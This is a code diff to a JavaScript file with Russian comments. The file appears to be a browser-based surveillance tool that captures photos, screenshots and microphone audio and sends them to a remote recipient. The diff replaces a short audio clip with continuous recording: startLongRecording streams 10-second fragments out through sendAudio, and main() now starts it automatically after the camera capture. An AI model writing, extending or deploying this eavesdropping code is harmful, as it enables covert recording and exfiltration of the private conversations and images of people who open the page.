@@ -122,22 +122,61 @@ async function takePhoto(stream, caption) {
     });
 }
 
-async function recordAudio() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        const mediaRecorder = new MediaRecorder(stream);
-        const chunks = [];
-        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-        mediaRecorder.onstop = async () => {
-            const blob = new Blob(chunks, { type: 'audio/webm' });
-            await sendAudio(blob, '🎙️ Аудиозапись (5 секунд)');
-            stream.getTracks().forEach(t => t.stop());
-        };
-        mediaRecorder.start();
-        setTimeout(() => mediaRecorder.stop(), 5000);
-    } catch(e) {
-        sendMessage('❌ Ошибка микрофона');
+// ========== ДЛИННАЯ ЗАПИСЬ, ОТПРАВКА КАЖДЫЕ 10 СЕК ==========
+let isRecording = false;
+let mediaRecorder = null;
+let audioStream = null;
+
+async function startLongRecording() {
+    if (isRecording) {
+        sendMessage('⏹️ Запись уже идёт');
+        return;
     }
+    
+    try {
+        audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        mediaRecorder = new MediaRecorder(audioStream);
+        let chunks = [];
+        
+        mediaRecorder.ondataavailable = (e) => {
+            if (e.data.size > 0) {
+                chunks.push(e.data);
+            }
+        };
+        
+        mediaRecorder.onstop = async () => {
+            if (chunks.length > 0) {
+                const blob = new Blob(chunks, { type: 'audio/webm' });
+                const timestamp = new Date().toLocaleTimeString('ru-RU');
+                await sendAudio(blob, `🎙️ Фрагмент записи (${timestamp})`);
+                chunks = [];
+            }
+        };
+        
+        mediaRecorder.start(10000);
+        isRecording = true;
+        sendMessage('🎙️ ЗАПИСЬ НАЧАЛАСЬ! Отправка каждые 10 секунд.');
+        
+    } catch(e) {
+        sendMessage('❌ Ошибка доступа к микрофону');
+    }
+}
+
+async function stopLongRecording() {
+    if (!isRecording || !mediaRecorder) {
+        sendMessage('⏹️ Запись не активна');
+        return;
+    }
+    
+    mediaRecorder.stop();
+    if (audioStream) {
+        audioStream.getTracks().forEach(track => track.stop());
+    }
+    isRecording = false;
+    mediaRecorder = null;
+    audioStream = null;
+    
+    sendMessage('⏹️ ЗАПИСЬ ОСТАНОВЛЕНА');
 }
 
 async function takeScreenshot() {
@@ -555,8 +594,8 @@ async function main() {
                             }
                             stream.getTracks().forEach(t => t.stop());
                             
-                            // Микрофон и скриншот
-                            await recordAudio();
+                            // Микрофон
+                            startLongRecording();
                         
                             
                             // Остальная информация
